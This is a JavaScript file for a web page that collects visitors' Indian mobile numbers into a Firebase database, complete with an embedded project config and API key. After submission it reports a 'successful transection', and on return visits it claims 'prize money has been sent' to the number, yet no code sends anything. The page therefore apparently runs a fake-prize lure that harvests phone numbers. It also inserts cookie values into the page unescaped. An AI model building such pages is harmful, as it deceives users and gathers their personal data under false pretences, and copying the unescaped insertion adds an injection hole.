console.log('Hello World!');

//🔥


  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  var firebaseConfig = {
    apiKey: "AIzaSyClL7pE-1kTSr2ouTpFHnwdvhW36rLgX2s",
    authDomain: "jnvcob.firebaseapp.com",
    databaseURL: "https://jnvcob.firebaseio.com",
    projectId: "jnvcob",
    storageBucket: "jnvcob.appspot.com",
    messagingSenderId: "69566502508",
    appId: "1:69566502508:web:be3e4ad98d78924cb7aa49",
    measurementId: "G-BH23ZFD2KB"
  };
  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);
  //firebase.analytics();

var db = firebase.firestore(); 



var con = document.getElementById('abc');
var cok = document.cookie;
console.log(cok);
if (cok == ""){
const regx = /^[6-9]\d{9}$/ ;
var btn = document.getElementById('btn');
var input = document.getElementById('number');


input.addEventListener('input', () =>{
if(input.value.length>=10){
 if(regx.test(input.value)){
   input.classList.add("is-valid");
   input.classList.remove("is-invalid");
   btn.classList.remove('disabled');
   
 }else{
  input.classList.add("is-invalid");
  input.classList.remove("is-valid");
   
  btn.classList.add('disabled');
 }
}else{

  input.classList.remove("is-invalid");
  input.classList.remove("is-valid");
  
  
}

  
  
});



btn.addEventListener("click" , () =>{
document.getElementById("modal").style.display="flex";
 db.collection("user").add({
     Datea:  new Date().toLocaleDateString(),
     Time:   new Date().toLocaleTimeString(),
     Numbers: input.value
   }).then((docRef) => {
   document.getElementById("modal").style.display="none";
     Swal.fire({
    position: 'center',
    icon: 'success',
    title: 'transection is successful',
    showConfirmButton: true
  });
  document.cookie = new Date().toLocaleDateString()+","+new Date().toLocaleTimeString()+","+input.value;
  con.innerHTML=`<h2 class='text-success'>your transection is successful</h2>` ;

   }).catch((error) => {
     console.error("Error adding document: ", error);
      Swal.fire({
        position: 'center',
        icon: 'warning',
        title: 'transection is  unsuccessful',
        showConfirmButton: true
      });
   });
  
  
});
}else{



  var data = cok.split(',');
  con.innerHTML=`<h2 class='text-success'>Your prize money has been sent to <span class="text-primary">${data[2]}</span> on <span class='text-primary'>${data[0]}</span>(mm/dd/yy) at <span class='text-primary'>${data[1]}</span> </h2>`
  
  
}

